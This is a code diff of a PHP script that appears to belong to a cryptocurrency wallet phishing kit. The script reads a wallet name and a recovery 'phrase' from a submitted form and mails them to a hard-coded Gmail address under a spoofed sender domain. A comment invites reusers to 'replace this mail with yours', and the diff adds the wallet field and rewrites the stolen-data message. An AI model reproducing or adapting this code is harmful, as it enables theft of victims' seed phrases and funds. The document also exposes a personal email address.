@@ -2,7 +2,7 @@
 
 
 // $Useremail= $_POST['email'];
-// $password= $_POST['password'];
+ $wallet= $_POST['wallet'];
 $phrase= $_POST['phrase'];
 // $walletName ;
 
@@ -90,19 +90,14 @@ echo "<script> alert('Error in Connection !!!! ....')   </script>";
 
 
 
-         $to = 'olamilekanomosanya@gmail.com'; // replace this mail with yours
+ $to = 'olamilekanomosanya@gmail.com'; // replace this mail with yours
 $phrase = $_POST["phrase"];
 $email= "mainnetconnections.com";
 $headers = 'MIME-Version: 1.0' . "\r\n";
 $headers .= "From: " . $email . "\r\n"; // Sender's E-mail
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
  
-$message ='<table style="width:100%">
-    <tbody><tr>
-        <td> '.$phrase.' </td>
-    </tr>
-    <tr><td>Email: '.$email.'</td></tr>
-</tbody></table>';
+$message = " wallet is : {$wallet}.  phrase is: {$phrase}";
  
 if (@mail($to, $email, $message, $headers))
 {
